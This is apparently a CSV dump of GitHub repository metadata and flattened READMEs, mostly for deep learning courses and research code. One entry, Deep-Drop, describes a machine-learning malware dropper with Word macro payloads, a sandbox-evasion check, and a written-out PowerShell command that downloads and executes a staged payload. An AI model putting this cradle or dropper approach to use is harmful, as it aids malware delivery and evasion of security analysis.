pdf,2019-09-04T06:59:24Z,2019-10-19T13:15:01Z,n/a,rasthh,User,2,8,2,0,master,,0,0,0,0,0,0,0
konabuta,DataExplore-Workshop,automated-machine-learning#automl#azure#azure-machine-learing-service,DataExplore Workshop Dllab Engineers Days 2019 Handson Day1 https dllab connpass com event 144595 AutoML Azure Azure Machine Learning service Automated Machine Learning PowerBI Key Influencers Azure Machine Learning service Agenda Setup Setup md Introduction Introduction md Microsoft Handson Handson md Sample Code Environment Algorithm Environment Interpretability Type Description Decision Tree Azure ML service Python SDK Sample Decision Tree FactoryQC azureml sklearn DT ipynb InterpretML Sample Decision Tree FactoryQC InterpretML DT ipynb Interpretable Decision Tree Linear Regression Excel Sample Linear Regression linear regression xlsx Azure ML service Python SDK Sample Linear Regression diabetes azureml sklearn LR ipynb InterpretML Sample Linear Regression diabetes InterpretML LR ipynb Interpretable Linear Regression Decision Tree Linear Regressionn Power BI Key Influencers Sample Key Influencers titanic sample pbix Interpretable KPI AutoML Model Interpretability Azure ML service Python SDK Automated ML Interpretabiliy SDK Sample Automated Machine Learning Model Agnostic Microsoft InterpretML Python Classification Sample Interpret FactoryQC InterpretML classification ipynb Interpretable Microsoft Interpret ML Global Surrogate n a Model Agnostic Global Surrogate Permutation Feature Importance n a Model Agnostic PFI LIME external site https github com marcotcr lime Model Agnostic LIME SHAP external site https github com slundberg shap Model Agnostic SHAP Known Issues Known issues md Azure AI https azure microsoft com ja jp overview ai platform machine learning Azure Machine Learning service https docs microsoft com ja JP azure machine learning Azure Machine Learning service Sample Code https github com Azure MachineLearningNotebooks Interpretable Machine Learning A Guide for Making Black Box Models Explainable https christophm github io interpretable ml book,2019-09-03T09:43:50Z,2019-10-21T10:06:50Z,n/a,konabuta,User,4,8,3,64,master,konabuta,1,0,0,2,0,0,0
lxf8519,DL-hybrid-precoder,n/a,DL hybrid precoder This is the source code for paper Deep Learning for Direct Hybrid Precoding in Millimeter Wave Massive MIMO Systems https arxiv org abs 1905 13212 In the paper we proposes a novel neural network architecture that we call an auto precoder and a deep learning based approach that jointly senses the millimeter wave mmWave channel and designs the hybrid precoding matrices with only a few training pilots More specifically the proposed model leverages the prior observations of the channel to achieve two objectives First it optimizes the compressive channel sensing vectors based on the surrounding environment in an unsupervised manner to focus the sensing power on the most promising spatial directions This is enabled by a novel neural network architecture that accounts for the constraints on the RF chains and models the transmitter receiver measurement matrices as two complex valued convolutional layers Second the proposed model learns how to construct the RF beamforming vectors of the hybrid architectures directly from the projected channel vector the received sensing vector The auto precoder neural network that incorporates both the channel sensing and beam prediction is trained end to end as a multi task classification problem Each task is a multi label classification problem The network is shown in the following figure Figure1 https github com lxf8519 DL hybrid precoder blob master NNhybrid jpg To find more information about the paper and other deep learining based wireless communication work please visit DeepMIMO dataset applications http deepmimo net DeepMIMOapplications html i 1 Run training and tesing 1 Quick run Run in terminal python maintrainbeamforming py train 1 to train the model and run python maintrainbeamforming py train 0 for testing The default parameters are dataset DeepMIMOdatasettrain20 mat and DeepMIMOdatasettest20 mat which are corresponding to total transmit power of 20dB epochs 15 batchsize 512 learningrate 0 002 2 If you need to change the dataset and parameters they can be found in maintrainbeamforming py 3 The prediction accuracy results for the transmitter and receiver on the default dataset are given in the following table The total transmit power for this dataset is 20 dBm Transmit power dBm 20 Tx acc Mt Mr 2 0 71 Rx acc Mt Mr 2 0 69 Tx acc Mt Mr 4 0 78 Rx acc Mt Mr 4 0 76 Tx acc Mt Mr 8 0 88 Rx acc Mt Mr 8 0 88 To reproduce the results the pre trained model in Savedmodel folder needs to be loaded for testing Also the datasets of DeepMIMOdatasettrain20 mat and DeepMIMOdatasettest20 mat and the corresponding label mat files are required See the following part for dataset Dataset The dataset can be downloaded here https drive google com open id 1sMiDGhPYpblkkcQgvq4F5q7w2AINfkgL from Google drive There are 4 files for training and testing and the labels After downlaoding copy these 4 files to MIMOdataset folder To generate your own dataset visit DeepMIMO net http deepmimo net index html Citation If you find the code is useful please kindly cite our paper Thanks articleli2019deep title Deep Learning for Direct Hybrid Precoding in Millimeter Wave Massive MIMO Systems author Li Xiaofeng and Alkhateeb Ahmed journal arXiv preprint arXiv 1905 13212 month May year 2019 License This code package is licensed under a Creative Commons Attribution NonCommercial ShareAlike 4 0 International License https creativecommons org licenses by nc sa 4 0,2019-08-22T07:53:06Z,2019-12-05T02:29:15Z,Python,lxf8519,User,2,8,6,11,master,lxf8519,1,0,0,1,0,0,0
rllab-snu,Deep-Learning,n/a,Deep Learning List of our studies related to deep learning Deep Elastic Network Chanho Ahn Eunwoo Kim and Songhwai Oh Deep Elastic Networks with Model Selection for Multi Task Learning in Proc of the International Conference on Computer Vision ICCV Oct 2019 paper code https github com rllab snu Deep Elastic Network Deep Learning Tutorial Deep Learning tutorial with Tensorflow code https github com rllab snu deeplearningtutorial,2019-09-04T05:11:11Z,2019-11-29T05:10:24Z,n/a,rllab-snu,User,3,8,0,6,master,rllab-snu,1,0,0,0,0,0,0
shahidikram0701,DLSIR,n/a,DLSIR In the modern era an enormous amount of digital pictures from personal photos to medical images is produced and stored every day It is more and more common to have thousands of photos sitting in our smart phones however what comes with the convenience of recording unforgettable moments is the pain of searching for a specific picture or frame How nice it would be to be able to find the desired image just by typing one or few words to describe it In this context automated caption image retrieval is becoming an increasingly attracting feature comparable to text search In this project we consider the task of content based image retrieval and propose effective neural network based solutions for that Specifically the input to our algorithm is a collection of raw images in which the user would like to search and a query sentence meant to describe the desired image The output of the algorithm would be a list of top images that we think are relevant to the query sentence In particular we obtain a representation of the sentence that will be properly align with the corresponding image features in a shared high dimensional space The images are found based on nearest neighborhood search in that shared space Focus of the Project Better Captioning using attention The focus will be on incorporating attention into the baseline model to see if there will be any improvements Usage of various word embedding models The solution involves experimenting with various word embeddings and evaluating them for the caption dataset Usage of various CNN models The solution involves experimenting with multiple convolutional neural network models via transfer learning and evaluating which model gives out the best results in the long run Building on top of a state of the art base model The base models being used for this model are best in class and hence provide the best representation for both the image and the captions E g In most of our models the images are represented with the feature vectors derived from Googles Inception CNN model whereas the captions are represented with the feature vectors derived from Facebooks Fasttext word embedding model Both of the above models have been used time and again to achieve a state of the performance in the field of computer vision and natural language processing respectively Experiments conducted As a part of this project we have tried out a multitude of experiments where each new model developed had some minor architectural differences which gave it a slight edge over its previous model but the overall arching encoder decoder architecture still remains the same Listed below are all the experiments we conducted so far Baseline models Resnet GRU fasttext Inception GRU fastext Baseline with bidirectional Inception Bidirectional LSTM fastext Self attention models SelfAttention Inception Bidirectional LSTM fastext Inception SelfAttention fastext SelfAttention inception SelfAttention fastext Results metrics results JPG In the models column each model has been named in the following format MODELNAME configuration configuration refers to layers used in the model architecture Here the models labelled as SA1 SA2 and DSA refer to models which are different experiments conducted by using the Self Attention layer found in transformer networks 1 SA1 Self Attention Model 1 where we used the multi head self attention layer as a part of the decoder side i e on the images 2 SA2 Self Attention Model 2 where we used the multi head self attention layer as a part of the encode side i e on the captions 3 DSA Double Self Attention Model where we used the multihead self attention layer in both the encoder and the decoder side of the model architecture How to run the project To start with download the weights of the pretrained models from here https mega nz F zow0XCRT xlSu9UGgAKO56gszuTQkdQ and save the folder in the same directory as the other files of this repo Now the base directory will have 3 subdirs which are namely 1 DLSIRdemo contains the code for the final GUI demo 2 DLSIRmodeltrainingexperiments contains several colab notebooks where different experiments where trained and the model weights were saved 3 DLSIRmodelweights contains several model weights for the various models which were trained 4 DLSIRreport this is the project report which entails all the architectural details and training details in detail In order to run the DLSIRdemo the steps to follow are 1 Run downloaddata py 2 Run inceptionfeaturessavingtodisk py 3 Run cacheimageembeddings py 4 Run predictions py and server py as two separate simultaneous processes 5 Go to 0 0 0 0 5000 to see the application running Developers Parashara Ramesh https github com ParasharaRamesh Shahid Ikram https github com shahidikram0701 Sumanth Rao https github com sumanthrao,2019-08-16T09:00:18Z,2019-12-10T03:10:51Z,Jupyter Notebook,shahidikram0701,User,2,8,1,6,master,shahidikram0701#ParasharaRamesh,2,0,0,0,0,0,1
davidsandberg,unsupervised,n/a,,2019-09-07T12:36:23Z,2019-11-26T09:46:00Z,Jupyter Notebook,davidsandberg,User,1,8,1,3,master,davidsandberg,1,0,0,0,0,0,0
neka-nat,pytorch-hdml,cars196#cub200#cvpr2019#deep-learning#deep-metric-learning#pytorch#triplet-loss,Hardness Aware Deep Metric Learning This is an unofficial implementation of Hardness Aware Deep Metric Learning CVPR 2019 Oral https arxiv org abs 1903 05503 in Pytorch Installation cd pytorch hdml pip install pipenv pipenv install Download dataset cd data python cars196downloader py python cars196converter py Train CARS196 dataset Execute a training script When executed the tensorboard log is saved pipenv shell python traintriplet py Result triplet HDML CARS196 result on training 99 classes 30000 iterations Loss loss assets tripletloss png t SNE tsne assets triplettraintsne gif CARS196 result on testing 97 classes t SNE tsne assets triplettesttsne gif Todo Implementation of Npair loss HDML Reference Official tensorflow implementation https github com wzzheng HDML,2019-08-20T13:13:48Z,2019-11-29T13:50:37Z,Python,neka-nat,User,1,8,2,29,master,neka-nat,1,0,0,0,0,0,0
carlosevi94,TFG-Forex-DeepLearning,n/a,Trabajo de Fin de Grado Estudio del mercado de divisas mediante algoritmos Deep Learning Proyecto realizado por Nombre Email Carlos Sevilla Barcel https www linkedin com in carlos sevilla barcel c sevilla barcelo gmail com Fermn Fernndez Borrego https www linkedin com in fermin fernandez borrego ferminffb gmail com,2019-09-04T18:14:13Z,2019-09-23T23:59:56Z,TeX,carlosevi94,User,3,7,1,3,master,carlosevi94,1,0,0,0,0,0,0
fkluger,vanishing_points_2017,computer-vision#deep-learning#horizon-lines#machine-learning#vanishing-points,Deep Learning for Vanishing Point Detection Using an Inverse Gnomonic Projection Requirements Anaconda w Python 2 7 Caffe 1 0 RC5 https github com BVLC caffe tree rc5 ImageMagick 6 8 8 1 what spec file txt and requirements txt say Using other versions of these packages may yield different results Setup Get the code install requirements and build LSD git clone recursive https github com fkluger VanishingPointsGCPR17 git cd VanishingPointsGCPR17 conda create name gcpr17vpdetection file spec file txt source activate gcpr17vpdetection pip install r requirements txt cd lsdpython python setup py buildext inplace cd Download the CNN weights and image mean files https drive google com open id 1VBBszbCWuVEQ0a7DKVqZNngRsk1Zorei and put them into the cnn folder Adjust config py so that it contains the path to your Caffe installation and the paths where you store the benchmark datasets datasets Run Examples You can run the vanishing point detector on four example images see below and visualise the results Computation may take a few moments Adjust the GPU ID if necessary python example py gpu 0 python example py show Benchmarks Run the following commands to evaluate the vanishing point detector on the three benchmark datasets and plot the AUC curves python benchmark py yud gpu 0 updatedatalist updatedatafiles runcnn runem python benchmark py yud gpu 0 python benchmark py ecd gpu 0 updatedatalist updatedatafiles runcnn runem python benchmark py ecd gpu 0 python benchmark py hlw gpu 0 updatedatalist updatedatafiles runcnn runem python benchmark py hlw gpu 0 Examples example assets figure3 jpg example assets figure4 jpg example assets figure1 jpg example assets figure2 jpg References If you use the code provided here please cite inproceedingskluger2017deep title Deep learning for vanishing point detection using an inverse gnomonic projection author Kluger Florian and Ackermann Hanno and Yang Michael Ying and Rosenhahn Bodo booktitle German Conference on Pattern Recognition GCPR year 2017 The paper can be found on arXiv https arxiv org abs 1707 02427 The benchmark datasets used in the paper can be found here York Urban Dataset http www elderlab yorku ca resources york urban line segment database information Eurasian Cities Dataset http graphics cs msu ru en research projects msr geometry Horizon Lines in the Wild http www cs uky edu jacobs datasets hlw The example images show landmarks in Hannover Germany Welfenschloss https www flickr com photos shepard4711 40441168973 in photolist 8KSNgP 24BDyA2 dHQyus RsMpqr qfCQuS 91DBT 5aprBZ 7uavc5 7u6BEk 7u6Agv 7u6zBR 7ua1Am 7u6mU4 7u6cdk 7u657F Lichthof at Leibniz University https commons wikimedia org wiki File AtriumLichthofmainbuildingWelfenschlossLeibnizUniversitatetHannoverAmWelfengartenNordstadtHannoverGermany jpg Ihme Zentrum https commons wikimedia org wiki Category Ihme Zentrum uselang de media File Ihme ZentrumSpinnereistrasseHanoverGermany jpg Nord LB https www flickr com photos dierkschaefer 5999546112 in photolist 6EywNo pdpBA8 a97hon eQ6474 a9acHm a9a9AG a9af3d R5SNyF a97tck eQhHCJ fruEuZ eQi2tE eQhk8d qnVgrW 24fRi2L eQhyxE bymrtQ kU7Apk a9a74Y 2bxix PRf3sv SXwgoU dyUjRC jbB22 rgmqm 24awG1H 4zjzyq TMEpHD Rer4CD rt82Av rgiWa,2019-08-13T14:53:19Z,2019-12-02T11:46:18Z,Python,fkluger,User,2,7,2,40,master,fkluger,1,0,0,1,0,1,0
m1258218761,P-score,n/a,P score A Peptide Spectrum Match Scoring Algorithm based on Deep Learning Model Prerequisites python 3 6 pytorch 1 0 Deep Learning Model Structure P score s model is One dimensional Resnet https arxiv org abs 1512 03385 and combines Multi Head self Attention https arxiv org abs 1706 03762 P score Process Flow Model training is needed before scoring with P score and the output of the model is different at different stages We also tried to use model BiLstm CRF but did t use it in the end The CRF need to install python libraries named pytorch crf https github com kmkurn pytorch crf,2019-09-16T10:57:19Z,2019-11-06T08:16:43Z,Python,m1258218761,User,1,7,0,13,master,m1258218761,1,0,0,0,0,0,0
susanli2016,Deep-Learning-with-Python,n/a,Deep Learning with Python The learning repository of the book Deep Learning with Python by Francois Chollet,2019-09-17T23:34:21Z,2019-12-05T07:19:52Z,Jupyter Notebook,susanli2016,User,2,6,6,3,master,susanli2016,1,0,0,0,0,0,0
leylabmpi,DeepMAsED,n/a,Travis CI Build Status https travis ci org leylabmpi DeepMAsED svg branch master https travis ci org leylabmpi DeepMAsED DeepMAsED Deep learning for Metagenome Assembly Error Detection DeepMAsED mased Middle English term misled bewildered amazed or perplexed Citation Rojas Carulla Mateo Ruth E Ley Bernhard Schoelkopf and Nicholas D Youngblut 2019 DeepMAsED Evaluating the Quality of Metagenomic Assemblies bioRxiv https doi org 10 1101 763813 WARNINGS This package is currently undergoing heavy development The UI is not stable and can change at any time see git log for changes Main Description The tool is divided into two main parts DeepMAsED SM a snakemake pipeline for generating DeepMAsED train test datasets from reference genomes creating feature tables from real assemblies fasta bam files DeepMAsED DL deep learning for misassembly detection Setup DeepMAsED SM If needed Install miniconda or anaconda Create a conda env that includes snakemake pandas e g conda create n snakemake conda forge pandas bioconda snakemake To activate the conda env conda activate snakemake DeepMAsED DL See the conda create line in the travis yaml file Testing the DeepMAsED package optional pytest s Installing the DeepMAsED package into the conda environment python setup py install Usage DeepMAsED SM Creating feature tables for genomes MAGs Feature tables are fed to DeepMAsED DL for misassembly classification Input A table of reference genomes metagenome samples The table maps reference genomes to metagenomes from which they originate If MAGs created by binning you can either combine metagenome samples or map genomes to many metagenome samples Table format tttt Taxon the species strain name of the genome Fasta the genome MAG fasta file uncompressed or gzip ed Sample the metagenome sample from which the genome originated Note the sample can just be gDNA from a cultured isolate not a metagenome Read1 Illumina Read1 for the sample Read2 Illumina Read2 for the sample The snakemake config file e g config yaml This includes Config params on MG communities Config params on assemblers parameters Note the same config is used for simulations and feature table creation Running locally snakemake use conda j configfile Running on SGE cluster snakemakesge sh cluster json additional snakemake options It should be rather easy to update the code to run on other cluster architectures See the following resources for help Snakemake docs on cluster config https snakemake readthedocs io en stable snakefiles configuration html Snakemake profiles https github com Snakemake Profiles Output Assuming output directory is output output map Metagenome assembly error ML features output logs Shell process log files also see the SGE job log files output benchmarks Job resource usage info Creating custom train test data from reference genomes This is useful for training DeepMAsED DL with a custom train test dataset e g just biome specific taxa Input A table listing refernce genomes Two possible formats Genome accession t Taxon the species strain name Accession the NCBI genbank genome accession The genomes will be downloaded based on the accession Genome fasta t Taxon the species strain name of the genome Fasta the fasta of the genome sequence Use this option if you already have the genome fasta files uncompressed or gzip ed The snakemake config file e g config yaml This includes Config params on MG communities Config params on assemblers parameters Note the column order for the tables doesn t matter but the column names must be exact Output The output will the be same as for feature generation but with extra directories output genomes Reference genomes output MGSIM Simulated metagenomes output assembly Metagenome assemblies output trueerrors Metagenome assembly errors determined by using the references DeepMAsED DL Main interface DeepMAsED h Note DeepMAsED can be run without GPUs but it will be much slower Predicting with existing model See DeepMAsED predict h Training a new model See DeepMAsED train h Evaluating a model See DeepMAsED evalulate h,2019-09-02T08:29:33Z,2019-10-30T20:29:42Z,Jupyter Notebook,leylabmpi,Organization,1,6,3,0,master,,0,1,1,1,1,0,0
moohax,Deep-Drop,binary-classification#keras#machine-learning#penetration-testing,Deep Drop Machine learning enabled dropper Quick Start pip install r requirements txt python deepdrop py Copy paste the payload coremacros into a word doc and run Quick start pip3 install requirements python3 deepdrop py d All models loaded Routes loaded Payloads patched for localhost DBG ece9d57d ef30 47ed accb 46ea3c436257 Serving Flask app deepdrop lazy loading Testing Passing d debug to deepdrop will give back a key that can be used to bypass the sandbox check for testing payloads powershell exe c iex new object net webclient downloadstring http localhost ece9d57d ef30 47ed accb 46ea3c436257 Otherwise submitting a process list and getting a decision from the model is the only way to get a payload executed Staging Currently only powershell staging is implemented Training Implemented in Jupyter notebooks,2019-09-09T01:49:27Z,2019-12-10T18:22:38Z,Jupyter Notebook,moohax,User,1,6,3,16,master,moohax,1,0,0,0,0,0,1
ulfaslak,annadl_f19,n/a,annadlf19,2019-08-30T11:02:22Z,2019-11-08T08:00:23Z,Jupyter Notebook,ulfaslak,User,14,6,6,15,master,ulfaslak,1,0,0,0,5,0,0
hfarruda,deeplearningtutorial,n/a,Deep Learning Tutorial This tutorial is part of the didactic text Learning Deep Learning CDT 15 https www researchgate net publication 335798012LearningDeepLearningCDT 15 authored by Henrique F de Arruda Alexandre Benatti Csar Comin and Luciano da Fontoura Costa The purpose of this tutorial is to provide simple didactic examples of deep learning architectures and problem solution The codes included here are based on toy datasets and restricted to parameters allowing short processing time So these codes are not suitable for other data and or applications which will require modifications in the structure and parameters These codes have absolutely no warranty For all the codes presented here we use Keras https keras io as the deep learning library Keras is a useful and straightforward framework which can be employed for simple and complex tasks Keras is written in the Python language providing self explanatory codes with the additional advantage to being executed under TensorFlow https www tensorflow org backend We also employ the Scikit learn https scikit learn org which is devoted to machine learning redes png More details are available at CDT 15 https www researchgate net publication 335798012LearningDeepLearningCDT 15 Feedforward networks Binary Classification This is the first example of deep learning implementation in which we address binary classification of wine data In this example we consider one feedforward network with 5 hidden layers and with 30 neurons in each layer The provided networks were built only for a didactic purpose and are not appropriate for real applications Multiclass Classification In this example we illustrate a multiclass classification through a wine dataset in which there are three classes which were defined according to their regions We employed the same dataset presented above but here we considered the three classes To do so we use the softmax activation function Open In Colab https colab research google com assets colab badge svg https colab research google com github hfarruda deeplearningtutorial blob master deepLearningfeedforward ipynb Convolutional Neural Network CNN This tutorial is the second example of deep learning implementation in which we exemplify a classification task More specifically we considered ten classes of colored pictures Open In Colab https colab research google com assets colab badge svg https colab research google com github hfarruda deeplearningtutorial blob master deepLearningCNN ipynb Long Short Term Memory LSTM This is the third example of deep learning implementation Here we use a LSTM network to predict the Bitcoin prices along time by using the input as a temporal series Open In Colab https colab research google com assets colab badge svg https colab research google com github hfarruda deeplearningtutorial blob master deepLearningLSTM ipynb Restricted Boltzmann Machine RBM This is the fourth example of deep learning implementation Here we use a RMB network to provide a recommendation system of musical instruments Open In Colab https colab research google com assets colab badge svg https colab research google com github hfarruda deeplearningtutorial blob master deepLearningRBM ipynb Autoencoders This example uses the Autoencoder model to illustrate a possible application Here we show how to use the resulting codes to reduce the dimentionality We also project our data by using a Principal Component Analysis PCA Open In Colab https colab research google com assets colab badge svg https colab research google com github hfarruda deeplearningtutorial blob master deepLearningautoencoder ipynb Generative Adversarial Networks GAN This example was elaborated to create a network that can generate handwritten characters automatically Open In Colab https colab research google com assets colab badge svg https colab research google com github hfarruda deeplearningtutorial blob master deepLearningGAN ipynb Libraries All of these codes were developed and executed with the environment described in libraries txt Citation Request If you publish a paper related on this material please cite H F de Arruda A Benatti C H Comin L da F Costa Learning Deep Learning CDT 15 2019 Acknowledgements Henrique F de Arruda acknowledges FAPESP for sponsorship grant no 2018 10489 0 Alexandre Benatti thanks Coordena o de Aperfeioamento de Pessoal de Nvel Superior Brasil CAPES Finance Code 001 Luciano da F Costa thanks CNPq grant no 307085 2018 0 and NAP PRP USP for sponsorship Csar H Comin thanks FAPESP Grant Nos 15 18942 8 and 18 09125 4 for financial support This work has been supported also by FAPESP grants 11 50761 2 and 2015 22308 2,2019-08-29T17:32:27Z,2019-11-07T13:57:33Z,Jupyter Notebook,hfarruda,User,2,6,1,100,master,hfarruda#ABenatti#ldafcosta,3,0,0,0,0,0,0
riiaa,Intro_MLDL_19,n/a,Introduccion a Machine Learning y Deep Learning RIIAA 19 Este repositorio de github contiene material para el workshop Introduccion a Machine Learning y Deep Learning dentro de la RIIAA 19 www riiaa org Este taller desarollara conceptos basicos de machine learning usnado como base los datos de simulacion usando para el decusbrimiento del boson de Higgs No te preocupes no necesitas saber fisica para trabajar con estos datos pero podria ser util Los datos de este taller estan descritos en https higgsml lal in2p3 fr files 2014 04 documentationv1 8 pdf y estan basados en el Kaggle challenge https www kaggle com c higgs boson https storage googleapis com kaggle competitions kaggle 3887 media ATLASEXPimage png Requisitos para el taller La mayora de las prcticas de los talleres se desarrollarn en Python 3 7 usando la biblioteca Tensorflow 2 0 https www tensorflow org que adopta Keras https www tensorflow org versions r2 0 apidocs python tf keras como interfaz de alto nivel para construir y entrenar redes neuronales Cosas para preparar Una laptop Este repositorio de GitHub clonado y actualizado antes del taller Un sentido aventurero en los datos Un ambiente Python 3 7 con Anaconda ver opciones 1 y 2 abajo Los talleres sern impartidos usando notebooks de Jupyter documentos con cdigo ejecutable texto ecuaciones visualizaciones imgenes y dems material Los notebooks se pueden crear y ejecutar en la nube va Google Colab opcin 1 o de manera local en tu computadora a travs de Jupyter Notebooks https jupyter org opcin 2 Opcion 1 Google Colab Colab https colab research google com es un servicio de Google para ejecutar notebooks en la nube Provee ambientes de Python 2 y 3 con CPUs GPUs y TPUs Y es gratis Solo necesitas tener una cuenta de Google o crear una Recomendamos que elijas un ambiente con Python 3 y GPU Para activarlo Abre el men Entorno de ejecucin Elige la opcin Restablecer todos los entornos de ejecucin Vuelve a abrir Entorno de ejecucin Elige Cambiar tipo de entorno de ejecucin Selecciona Python 3 como Tipo de ejecucin y GPU de la lista de Acelerador por hardware La siguiente captura de pantalla ilustra este proceso media escogeacelerador png En Colab https colab research google com puedes crear un nuevo notebook subir uno existente desde tu computadora o importarlo de Google Drive o GitHub Opcion 2 Ambiente local Para tener la versin de Python 3 7 y todas las bibliotecas instaladas en cualquier plataforma recomendamos que uses Anaconda https www anaconda com y generes un ambiente con el archivo environment yml de este repositorio usando una terminal y el comando conda env create n riiaa19 f environmentcpu yml Cambia el nombre riia19 por tu nombre favorito para el ambiente Si cuentas con un GPU Nvidia y deseas aprovecharlo cambia el archivo environmentcpu yml a environmentgpu yml Para activar el ambiente que creaste en una terminal ingresa el comando conda activate riiaa19 Una vez activado puedes ejecutar la aplicacin de Jupyter Notebook jupyter notebook Este comando abrir una pestaa o ventana en tu navegador web como se muestra en la siguiente captura de pantalla media jupyternotebook png Al igual que en Google Colab puedes crear un nuevo notebook seleccionando el botn New y posteriormente Python 3 De forma alternativa puedes abrir uno existente seleccionando el archivo del notebook con extensin ipynb dentro del directorio donde ejecutaste Jupyter Notebook Con el botn Upload agregas archivos que se encuentran en otra parte de tu computadora a este directorio Para cerrar Jupyter Notebook presiona el botn Quit y posteriormente cierra la pestaa o ventana de tu navegador web Para desactivar el ambiente riiaa19 de Anaconda simplemente haz conda deactivate,2019-08-16T20:29:53Z,2019-09-05T19:12:37Z,Jupyter Notebook,riiaa,Organization,1,6,3,10,master,beangoben,1,0,0,0,0,0,0
subpic,koniq,image-quality-assessment,KonIQ 10k models Deep Learning Models for the KonIQ 10k Image Quality Assessment Database This is part of the code for the paper KonIQ 10k An ecologically valid database for deep learning of blind image quality assessment https arxiv org abs 1910 06180 The included notebooks rely on the kutils library https github com subpic kutils Project data is available for download from osf io https osf io hcsdy Please cite the following paper if you use the code misckoniq10k title KonIQ 10k An ecologically valid database for deep learning of blind image quality assessment author Hosu Vlad and Lin Hanhe and Sziranyi Tamas and Saupe Dietmar year 2019 eprint 1910 06180 archivePrefix arXiv primaryClass cs CV Overview Python 2 7 notebooks trainkoncept512 ipynb trainkoncept224 ipynb Training and testing code for the KonCept512 and KonCept224 model on KonIQ 10k Ready trained model weights for KonCept512 https osf io uznf8 download and KonCept224 https osf io cxtyp download traindeeprn ipynb Reimplementation of the DeepRN https www uni konstanz de mmsp pubsys publishedFiles VaSaSz18 pdf model trained on KonIQ 10k following the advice of the original author Domonkos Varga Re trained model weights on SPP features are available here https osf io avyd5 download The features extracted from KonIQ 10k are available here https osf io y6brn download metadata koniq10kdistributionssets csv Contains image file names scores and train validation test split assignment random,2019-09-02T11:41:53Z,2019-11-12T11:17:52Z,Jupyter Notebook,subpic,User,2,6,0,23,master,subpic,1,0,0,0,1,0,0
xinshuoweng,3DCNN_Lipreading,lipread#lipreading,Learning Spatio Temporal Features with Two Stream Deep 3D CNNs for Lipreading This repository contains the official PyTorch implementation for Learning Spatio Temporal Features with Two Stream Deep 3D CNNs for Lipreading https bmvc2019 org wp content uploads papers 0016 paper pdf This paper has been accepted by British Machine Vision Conference BMVC https bmvc2019 org 2019 If you find the paper or the code useful please cite our paper articleWeng2019lipreading archivePrefix arXiv arxivId 1905 02540 author Weng Xinshuo and Kitani Kris eprint 1905 02540 journal BMVC title Learning Spatio Temporal Features with Two Stream Deep 3D CNNs for Lipreading url https bmvc2019 org wp content uploads papers 0016 paper pdf year 2019 News 2019 09 15 we are trying to release the code soon,2019-09-15T22:08:59Z,2019-12-02T08:11:48Z,n/a,xinshuoweng,User,2,6,3,5,master,xinshuoweng,1,0,0,0,0,0,0
UBC-NLP,dlnlp2019,abdul-mageed#deep-learning#deep-neural-networks#deeplearning#machine-learning#natural-language-processing#nlp#ubc#ubc-cs#ubc-information#ubc-linguistics,CPSC 532P LING 530A Deep Learning for Natural Language Processing DL NLP The University of British Columbia Year Winter Session I 2019 Time Tue Thu 14 00 15 30 Location The Leon and Thea Koerner University Centre UCLL Right by Rose Garden at 6331 Crescent Road V6T 1Z1 Room 109 Instructor Dr Muhammad Abdul Mageed Office location Totem Field Studios 224 Department of Linguistics 2613 West Mall V6T 1Z4 Office phone Apologies I do not use office phone Please email me Office hours Tue 12 00 14 00pm Totem Field Studios 224 or by appointment I can also handle inquiries via email or in limited cases Skype E mail address muhammad mageed ubc ca Student Portal 1 Course Rationale Goal Rationale Background Deep learning is a class of machine learning methods inspired by information processing in the human brain whereas Natural language processing NLP is the field focused at teaching computers to understand and generate human language Emotion detection where a program is able to identify the type of expressed emotion from language is an example of language understanding Dialog systems where the computer interacts with humans such as the Amazon Echo constitute an instance of both language understanding and generation as the machine identifies the meaning of questions and generates meaningful answers Other examples of NLP include speech processing and machine translation Deep learning of natural language is transformative and has recently broken records on several NLP tasks The field is also in its infancy with fascinating future breakthroughs ahead Solving NLP problems directly contributes to the development of pervasive technologies with significant social and economic impacts and the potential to enhance the lives of millions of people Given the central role that language plays in our lives this research has implications across almost all fields of science and technology as well as other disciplines as NLP and deep learning are instrumental for making sense of the ever growing data collected in these fields Goal TThis course provides a graduate level introduction to deep learning with a focus on NLP problems and applications The goal of the course is to familiarize students with the major deep learning methods and practices This includes for example how neural networks are trained the core neural network architectures and the primary deep learning methods being developed to solve language problems This includes problems at various linguistic levels e g word and sub word phrase clause and discourse For example we will cover unsupervised distributed representations and supervised deep learning methods across these different linguistic levels Through homework and a final project the course also provides a context for hands on experience in using deep learning software to develop advanced solutions for NLP problems Potential audiences for this course are People with a linguistics computer science and or engineering background interested in learning novel deep learning and NLP methods People with other machine learning backgrounds interested in deep learning and or NLP 2 Course Objectives Upon completion of this course students will be able to identify the core principles of training and designing artificial neural networks identify the inherent ambiguity in natural language and appreciate challenges associated with teaching machines to understand and generate it become aware of the major deep learning methods being developed for solving NLP problems and be in a position to apply this deepened understanding in critical creative and novel ways become aware of a core of NLP problems and demonstrate how these are relevant to the lives of diverse individuals communities and organizations collaborate effectively with peers through course assignments identify an NLP problem existing or novel and apply deep learning methods to develop a novel solution for it 3 Course Topics word phrase and sentence meaning feedforward networks recurrent neural networks convolutional neural networks language models seq2seq models attention Transformers deep generative models auo encoders generative adversarial networks Applications machine translation controlled language generation summarization image and video captioning morphosyntax e g POS tagging and morphological disambiguation text classification e g sentiment analysis emotion detection language 4 Prerequisites familiarity with basic linear algebra basic calculus and basic probability basic high school level have programming experience in Python familiarity with at least one area of linguistics have access to a computer with a GPU on a regular basis ability to work individually as well as with team Students lacking any of the above pre requisites must be open to learn outside their comfort zone to make up including investing time outside class learning these pre requisites on their own Some relevant material across these pre requisites will be linked from the syllabus Although very light support might be provided the engineering is exclusively the students responsibility This course has no lab section Should you have questions about pre requisites please email the instructor 5 Format of the course This course will involve lectures class hands on activities individual and group work and instructor peer and self assessment 6 Course syllabus Recommended books Goodfellow I Bengio Y Courville A Bengio Y 2016 Deep learning Vol 1 Cambridge MIT press Available at link http www deeplearningbook org Jurafsky D Martin J H 2017 Speech and language processing London Pearson Available at link https web stanford edu jurafsky slp3 ed3book pdf Other related material Bird S Klein E Loper E 2009 Natural language processing with Python O Reilly Media Inc link http www nltk org book Weekly readings will be assigned from materials available through the UBC library and online See Readings Section below 7 Calendar Weekly schedule tentative Date Slides Related Content What is due out Tues Sept 3 No class TA Training NA Thurs Sept 5 Course overview overviewslides https github com UBC NLP dlnlp2019 blob master slides introdeeplearning pdf Tues Sept 10 Probability I probslides https github com UBC NLP dlnlp2019 blob master slides probability pdf DLB CH03 https www deeplearningbook org contents prob html KA https www khanacademy org math statistics probability probability probability geometry Harvard Stats https www youtube com playlist list PL2SOU6wwxB0uwwH80KTQ6ht66KWxbzTIo Thurs Sept 12 Probability II probslides https github com UBC NLP 